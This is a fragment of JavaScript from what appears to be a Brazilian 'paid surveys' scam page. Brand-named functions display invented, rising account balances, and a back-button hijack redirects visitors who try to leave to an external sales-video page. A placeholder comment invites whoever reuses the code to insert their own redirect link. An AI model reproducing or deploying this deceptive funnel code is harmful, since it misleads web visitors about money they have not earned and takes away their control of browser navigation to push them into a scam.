...
function nubank() {
    ...
    document.getElementById('saldo').innerHTML = 'R$68,92';
    scrollToTop();
...
function bradesco() {
    ...
    document.getElementById('saldo').innerHTML = 'R$92,04';
    scrollToTop();
...
function mcdonalds() {
    ...
    document.getElementById('saldo').innerHTML = 'R$111,25';
    scrollToTop();
    ...
    var a = {
       ...
       hasChanged: function() {
         if (b.location.hash == "#no-back") {
           b.location.hash = "#";
           b.location.href = "https://enriquecendoonline.site/opinepix-vsl"; //LINK PARA REDIRECIONAR AQUI
         }
       },
